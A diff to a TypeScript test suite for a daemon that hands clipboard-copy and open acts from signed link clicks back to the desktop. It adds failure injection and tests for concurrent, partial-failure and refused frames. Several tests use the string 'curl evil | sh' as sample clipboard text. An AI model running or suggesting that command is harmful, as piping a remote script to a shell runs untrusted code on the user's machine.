@@ -15,6 +15,7 @@ import {
 } from "../src/daemon/foundations/protocol";
 import { systemTimekeeper } from "../scripts/lib/system-clock";
 import { clickParts } from "./helpers/click-parts";
+import { DesktopActs } from "../src/daemon/desktop-acts";
 import type { LaunchResult } from "../src/proc/launcher";
 import { testVerbContext, actingWorld } from "./helpers/click";
 import { TEST_SIGNER } from "./helpers/link-signer";
@@ -29,6 +30,8 @@ function host(
     stderr: "",
     exitCode: 0,
   } as LaunchResult,
+  // How many acts the host performs before every later one fails.
+  succeeding = Infinity,
 ) {
   const copied: string[] = [];
   const unheard: string[] = [];
@@ -39,9 +42,11 @@ function host(
     ...verbCtx
   } = testVerbContext(new SessionState());
   // The clipboard, as the host's copy act writes it.
-  const world = actingWorld(
+  const desktop = new DesktopActs();
+  const acting = actingWorld(
     verbCtx,
     {
+      desktop,
       launch: async (opts: { stdinInput?: string }) => {
         await copying;
         copied.push(opts.stdinInput ?? "");
@@ -50,12 +55,21 @@ function host(
     },
     (text) => void unheard.push(text),
   );
+  let performed = 0;
+  const world = {
+    ...acting,
+    perform: (act: Parameters<typeof acting.perform>[0]) =>
+      ++performed > succeeding
+        ? Promise.resolve({ kind: "failed" as const, reason: "boom" })
+        : acting.perform(act),
+  };
   const events: string[] = [];
   const parts = {
     clock: systemTimekeeper,
     payloadProviders: {},
     frameFeeds: { latest: () => null },
     rendererForClick: () => undefined,
+    desktopActs: desktop,
     log: (_level: string, line: string) => events.push(line),
     ...clickParts(verbCtx, undefined, world),
   } as unknown as DaemonParts;
@@ -211,7 +225,7 @@ describe("a frame that asks for its acts on the desktop", () => {
     const h = host();
     const answered = await desktopFrame(h, TEST_SIGNER.signLink(COPY));
     expect(answered.told).toEqual({ when: "landed" });
-    expect(await answered.land()).toEqual({
+    expect((await answered.land()).resp).toEqual({
       ok: true,
       output: "",
       desktopActs: [{ kind: "copy", text: "curl evil | sh" }],
@@ -224,7 +238,7 @@ describe("a frame that asks for its acts on the desktop", () => {
   test("is handed an open and launches nothing here", async () => {
     const h = host();
     const answered = await desktopFrame(h, TEST_SIGNER.signLink(OPEN));
-    expect(await answered.land()).toEqual({
+    expect((await answered.land()).resp).toEqual({
       ok: true,
       output: "",
       desktopActs: [{ kind: "open", target: "/work/repo" }],
@@ -259,7 +273,7 @@ describe("a frame that asks for its acts on the desktop", () => {
     expect(h.copied).toEqual([]);
   });
 
-  test("a version 1 writer, which reads nothing, is told never", async () => {
+  test("a version 1 frame, whose writer reads no verdict to carry the acts, is refused and acts nowhere", async () => {
     const h = host();
     const answered = await h.frame(
       TEST_SIGNER.signLink(COPY),
@@ -269,6 +283,44 @@ describe("a frame that asks for its acts on the desktop", () => {
     expect(answered.told).toEqual({ when: "never" });
     await answered.land();
     expect(h.copied).toEqual([]);
+    expect(h.events).toEqual([expect.stringContaining("outcome=bad-request")]);
+  });
+
+  test("two clicks landing together each hand back their own acts", async () => {
+    const h = host();
+    const urls = ["first", "second"].map((text) =>
+      TEST_SIGNER.signLink(effectsUrl([{ verb: VERB_COPY, args: [text] }])),
+    );
+    const both = await Promise.all(urls.map((url) => desktopFrame(h, url)));
+    const verdicts = await Promise.all(both.map((answered) => answered.land()));
+    expect(verdicts.map(({ resp }) => resp)).toEqual([
+      { ok: true, output: "", desktopActs: [{ kind: "copy", text: "first" }] },
+      { ok: true, output: "", desktopActs: [{ kind: "copy", text: "second" }] },
+    ]);
+  });
+
+  test("a click that fails after asking a copy still hands the copy back, and is answered as failed", async () => {
+    const h = host(undefined, undefined, 1);
+    const twice = effectsUrl([
+      { verb: VERB_COPY, args: ["kept"] },
+      { verb: VERB_COPY, args: ["lost to a failure"] },
+    ]);
+    const answered = await desktopFrame(h, TEST_SIGNER.signLink(twice));
+    expect((await answered.land()).resp).toMatchObject({
+      ok: false,
+      code: "RENDER_FAILED",
+      desktopActs: [{ kind: "copy", text: "kept" }],
+    });
+  });
+
+  test("a verdict its writer never took says the acts it carried went with it", async () => {
+    const h = host();
+    const answered = await desktopFrame(h, TEST_SIGNER.signLink(COPY));
+    (await answered.land()).settled(false);
+    expect(h.events).toEqual([
+      expect.stringContaining("outcome=ok"),
+      expect.stringContaining("1 copy or open act(s)"),
+    ]);
   });
 
   test("a frame that does not ask is told at once, and its click copies on this machine", async () => {
@@ -276,7 +328,7 @@ describe("a frame that asks for its acts on the desktop", () => {
     const answered = await h.frame(TEST_SIGNER.signLink(COPY));
     expect(toldAtOnce(answered)).toEqual({ ok: true, output: "" });
     // Nothing was handed off, whatever the writer is told of it.
-    expect(await answered.land()).toMatchObject({ ok: true, desktopActs: [] });
+    expect((await answered.land()).resp).toMatchObject({ ok: true, desktopActs: [] });
     expect(h.copied).toEqual(["curl evil | sh"]);
   });
 });
